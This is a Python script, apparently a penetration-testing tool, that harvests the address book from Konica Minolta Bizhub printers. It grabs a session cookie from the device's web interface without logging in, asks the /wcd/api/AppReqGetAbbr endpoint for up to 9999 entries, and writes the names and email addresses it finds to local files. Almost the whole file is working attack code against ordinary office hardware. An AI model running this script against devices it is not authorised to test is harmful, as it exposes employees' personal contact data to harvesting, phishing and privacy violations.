#!/usr/bin/env python3
import argparse
import requests
import sys
import warnings
import json

# Suppress the "InsecureRequestWarning" because we're using verify=False
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter("ignore", InsecureRequestWarning)

def parse_args():
    parser = argparse.ArgumentParser(
        description="Fetch Konica Bizhub Address Book by auto-getting the session cookie or using a provided one."
    )
    parser.add_argument(
        "--ip", 
        required=True, 
        help="Hostname or IP of the Konica Bizhub (e.g. 10.20.30.65)."
    )
    parser.add_argument(
        "-c", "--cookie", 
        default=None, 
        help="Optional: If you already have a valid 'ID=...' cookie, supply it here."
    )
    parser.add_argument(
        "-n", "--names", 
        action="store_true", 
        help="If set, also dump the full names to a file."
    )
    return parser.parse_args()

def auto_get_cookie(ip):
    """
    Step 1: Perform a GET to https://<ip>/wcd/index.html
    to retrieve (or refresh) a session cookie.
    Returns the full cookie jar and/or the 'ID=' value if present.
    """
    url = f"https://{ip}/wcd/index.html"
    print(f"[*] Attempting to auto-fetch cookie from {url}")
    session = requests.Session()
    try:
        resp = session.get(url, verify=False, timeout=10)
        resp.raise_for_status()
        # At this point, session.cookies should contain whatever
        # 'Set-Cookie' the device returned. Typically something with "ID=..."
        if "ID" in session.cookies:
            # The requests CookieJar will have stored ID=xyz
            print(f"    Got ID cookie from device: {session.cookies.get('ID')}")
        else:
            print("[!] The device did not return an 'ID' cookie. We may be unauthorized.")
        return session
    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching cookie: {e}")
        return None

def fetch_address_book(ip, session=None, raw_cookie=None):
    """
    Step 2: Post to /wcd/api/AppReqGetAbbr with the JSON body,
    using either:
      - a requests.Session that already has an ID cookie, or
      - a raw 'Cookie: ID=...' header if provided in raw_cookie.

    Returns the parsed JSON (dict) or None on failure.
    """
    url = f"https://{ip}/wcd/api/AppReqGetAbbr"

    # The device wants a JSON string in the request body,
    # but also might want "application/x-www-form-urlencoded" as Content-Type.
    # We'll replicate that from your successful curl command, but
    # simply post the raw JSON string as data.
    #
    # If your device only returns 50 records at a time, you might need
    # multiple requests with different Start/End, or just pick a large End like 9999.
    payload = (
        '{"AbbrListCondition":{"WellUse":"false","SearchKey":"None",'
        '"ObtainCondition":{"Type":"IndexList","IndexRange":{"Start":1,"End":9999}},'
        '"SortInfo":{"Condition":"No","Order":"Ascending"},"AddressKind":"Public","SearchSendMode":"0"}}'
    )

    headers = {
        "User-Agent":       "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept":           "application/json, text/javascript, */*; q=0.01",
        "Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin":           f"https://{ip}",
        "Referer":          f"https://{ip}/wcd/spa_main.html",
        # If we have a raw cookie string, set it. Otherwise, rely on session.
    }
    if raw_cookie:
        headers["Cookie"] = raw_cookie

    try:
        if session:
            # Use the existing Session (which has the ID cookie in session.cookies)
            r = session.post(url, headers=headers, data=payload, verify=False, timeout=15)
        else:
            # No session, so rely on the raw_cookie approach
            r = requests.post(url, headers=headers, data=payload, verify=False, timeout=15)
        print(f"[*] POST returned status {r.status_code}")
        if r.status_code == 200:
            return r.json()  # might raise JSONDecodeError if not valid JSON
        else:
            print("[!] Non-200 response. Possibly unauthorized or invalid cookie.")
            print("    Response text (first 500 chars):", r.text[:500])
            return None
    except (requests.exceptions.RequestException, json.JSONDecodeError) as e:
        print(f"[!] Error during address book fetch: {e}")
        return None

def extract_names_and_emails(data):
    """
    Pull out the "Name" and the Email "To" from the JSON data.
    Adapt if your device’s JSON keys differ.
    """
    names = []
    emails = []

    if not data:
        return names, emails

    # Common key path: data["AbbrList"]["Abbr"] -> list
    try:
        abbr_list = data["AbbrList"]["Abbr"]
    except (KeyError, TypeError):
        return names, emails

    for entry in abbr_list:
        name = entry.get("Name", "").strip()
        to_email = ""
        try:
            to_email = entry["SendConfiguration"]["AddressInfo"]["EmailMode"]["To"].strip()
        except (KeyError, AttributeError):
            pass

        if name:
            names.append(name)
        if to_email:
            emails.append(to_email)

    return names, emails

def main():
    args = parse_args()
    ip = args.ip

    # 1) If user gave us a cookie with --cookie, we'll skip the auto fetch.
    #    Otherwise, we attempt the GET /wcd/index.html to get "ID=..."
    session = None
    raw_cookie = None

    if args.cookie:
        print("[*] Using user-supplied cookie string.")
        raw_cookie = args.cookie
    else:
        session = auto_get_cookie(ip)
        if not session:
            print("[!] Could not auto-fetch a session cookie. Exiting.")
            sys.exit(1)

    # 2) Fetch the address book
    data = fetch_address_book(ip, session=session, raw_cookie=raw_cookie)
    if not data:
        print("[!] No data returned. Possibly invalid cookie or no permission.")
        sys.exit(1)

    # 3) Extract the relevant info
    names, emails = extract_names_and_emails(data)
    unique_names = sorted(set(names))
    unique_emails = sorted(set(emails))

    print(f"[+] Found {len(unique_names)} unique names.")
    print(f"[+] Found {len(unique_emails)} unique email addresses.")

    # If there's nothing, exit
    if not unique_names and not unique_emails:
        print("[!] No entries found or device returned an empty list.")
        sys.exit(0)

    # Otherwise write out the email addresses
    email_filename = f"bizhub-addrBk_emailAddr_{ip}.txt"
    with open(email_filename, "w", encoding="utf-8") as f:
        for e in unique_emails:
            f.write(e + "\n")
    print(f"[+] Email addresses written to: {email_filename}")

    # Optionally write out the names
    if args.names:
        names_filename = f"bizhub-addrBk_names_{ip}.txt"
        with open(names_filename, "w", encoding="utf-8") as f:
            for n in unique_names:
                f.write(n + "\n")
        print(f"[+] Names written to: {names_filename}")

if __name__ == "__main__":
    main()
